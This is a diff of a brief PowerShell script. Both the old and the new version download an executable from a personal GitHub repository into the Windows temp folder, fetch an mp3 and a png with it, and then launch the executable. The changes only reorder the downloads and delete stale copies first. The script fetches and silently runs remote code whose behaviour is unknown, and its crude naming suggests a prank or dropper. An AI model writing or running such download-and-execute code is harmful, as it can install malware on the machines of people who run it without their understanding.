@@ -1,18 +1,35 @@
-$exe = $env:temp + "\myexe.exe"
-$mp3 = $env:temp + "\assets\gays.mp3"
-$ura = $env:temp + "\assets\ura.png"
+$client = New-Object System.Net.WebClient
 
-if (Test-Path $exe) {
-  Remove-Item $exe
-  write-host "$exe has been deleted"
+$file = $env:temp + "\assets\gays.mp3"
+
+if (Test-Path $file) {
+  Remove-Item $file
+  write-host "$file has been deleted"
 }
 else {
-  Write-host "$exe doesn't exist"
+  Write-host "$file doesn't exist"
 }
+$client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/gayz.mp3", $file)
 
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("https://github.com/jostanise/s/raw/main/gayz/gayz.exe", $exe)
-$client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/ura.png", $ura)
-$client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/gayz.mp3", $mp3)
-Start-Process -Filepath $exe
+$file = $env:temp + "\assets\ura.png"
 
+if (Test-Path $file) {
+  Remove-Item $file
+  write-host "$file has been deleted"
+}
+else {
+  Write-host "$file doesn't exist"
+}
+$client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/ura.png", $file)
+
+$file = $env:temp + "\myexe.exe" 
+if (Test-Path $file) {
+  Remove-Item $file
+  write-host "$file has been deleted"
+}
+else {
+  Write-host "$file doesn't exist"
+}
+$client.DownloadFile("https://github.com/jostanise/s/raw/main/gayz/gayz.exe", $file)
+
+Start-Process -Filepath $file
